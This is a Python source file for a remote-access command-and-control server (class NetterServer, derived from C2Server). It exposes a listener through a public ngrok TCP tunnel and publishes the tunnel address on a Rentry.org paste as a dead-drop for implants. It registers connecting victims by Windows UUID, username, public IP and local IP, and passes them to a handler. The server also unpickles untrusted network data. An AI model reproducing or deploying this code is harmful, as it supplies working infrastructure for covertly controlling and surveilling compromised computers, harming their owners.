import socket, pyngrok
import pyngrok.ngrok

import hashlib, pickle
from typing import Optional

from .rentry import Rentry
from .enums import NetterClient, PacketType
from .handler import ClientHandler
from .logger import C2Server

class ClientWrapper:
    BYTES_CHUNK: int = 2048

    def __init__(
        self, socket_: socket.socket, netServer: Optional["NetterServer"] = None
    ) -> None:
        self.socket = socket_
        self.netServer: "NetterServer" = netServer

    def send_(self, packetType: int, data: bytes | str) -> None:
        if isinstance(data, str):
            data = data.encode("utf-8")

        packet_length: int = len(data).to_bytes(4, "big")
        packet_type: int = packetType.value.to_bytes(2, "little")

        self.socket.send(packet_length)
        self.socket.send(packet_type)

        for chunk in range(0, len(data), self.BYTES_CHUNK):
            self.socket.sendall(data[chunk : chunk + self.BYTES_CHUNK])

    def receive(self) -> bytes:
        packetLength: int = int.from_bytes(self.socket.recv(4), "big")
        packet_type: int = int.from_bytes(self.socket.recv(2), "little")
        data, total_received = bytearray(), 0

        while total_received < packetLength:
            chunk = self.socket.recv(min(self.BYTES_CHUNK, packetLength - total_received))

            if not chunk:
                raise RuntimeError("Socket connection broken")

            data.extend(chunk)
            total_received += len(chunk)

        if (packet_type in [PacketType.CONSOLE_INFO,PacketType.CONSOLE_ERROR,PacketType.CONSOLE_WARNING] and self.netServer):
            self.netServer.console_log(
                data.decode("utf-8"),
                level = PacketType._value2member_map_[packet_type].name[8:],
            )
            return len(data)

        return bytes(data)

class NetterServer(C2Server):
    bindAddress: tuple[str, int] = None

    ngrokAddress: str = None
    rentryUrlName: str = None
    rentryEditCode: str = None

    _logs: list = None

    def __init__(self, bind_address: Optional[tuple[str, int]] = None, ngrokConfig: Optional[pyngrok.ngrok.PyngrokConfig] = None) -> None:
        super().__init__(self)
        self.ngrokConfig: pyngrok.ngrok.PyngrokConfig = ngrokConfig
        self.bindAddress = bind_address if bind_address else ("localhost", 5000)
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.connectionList: list[NetterClient] = list()
        self.alive = True

    def startNgrokTunnel(self, useRentry=False):
        """
        This function starts a Ngrok tunnel and optionally updates a Rentry.org entry with the tunnel's address.

        Parameters:
        - useRentry (bool): If True, the function will attempt to update a Rentry.org entry with the tunnel's address.
        - rentryEditCode (str): The edit code for the Rentry.org entry. If useRentry is True and this is not provided,
            the function will raise a ValueError.

        Returns:
        - str: The Ngrok tunnel's address.

        Raises:
        - ValueError: If useRentry is True and rentryEditCode is not provided.
        """

        if not (self.rentryUrlName):
            raise ValueError("rentryUrlName must be set before startNgrokTunnel()")

        if not (self.ngrokConfig):
            raise ValueError("ngrokConfig must be set before startNgrokTunnel()")

        _tunnel = pyngrok.ngrok.connect(
            self.bindAddress[1], "tcp", pyngrok_config=self.ngrokConfig
        )
        self.ngrokAddress = _tunnel.public_url[6:]
        self.console_log(
            "Ngrok tunnel started at %s" % self.ngrokAddress,
        )

        if useRentry:
            Rentry.edit(
                urlName=self.rentryUrlName,
                edit_code=self.rentryEditCode,
                text=self.ngrokAddress,
            )

            if (rentryContent := Rentry.get_content("https://rentry.org/" + self.rentryUrlName)) is None:
                self.console_log(
                    "Failed to fetch content from Rentry.org (rentryUrlName not valid)"
                )
                return

            if (rentryContent.content if rentryContent.content else rentryContent.title) != self.ngrokAddress:
                self.console_log("Failed to edit content for %s" % self.rentryUrlName)
            else:
                self.console_log(
                    "Ngrok address is now accessible through `%s`" % self.rentryUrlName
                )

        return self.ngrokAddress

    def listen(self):
        try:
            if not (self.ngrokConfig):
                raise ValueError("ngrokConfig must be set before listen()")

            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind(self.bindAddress)
            self.socket.listen(5)
            self.console_log(
                "Server is listening on %s:%s" % self.bindAddress,
            )

            while self.alive is True:
                clientSocket: ClientWrapper = ClientWrapper(
                    self.socket.accept()[0], self
                )

                if _deviceInformation := pickle.loads(clientSocket.receive()):
                    device: NetterClient = NetterClient(clientSocket,
                        hashlib.sha256(_deviceInformation["Windows_UUID"].encode()).hexdigest()[:20],
                        _deviceInformation["Username"],
                        _deviceInformation["Public_IP"],
                        _deviceInformation["Local_IP"],
                    )

                    self.connectionList.append(device)
                    ClientHandler(clientSocket, device, self).start()

        except Exception as e:
            self.console_log(str(e))
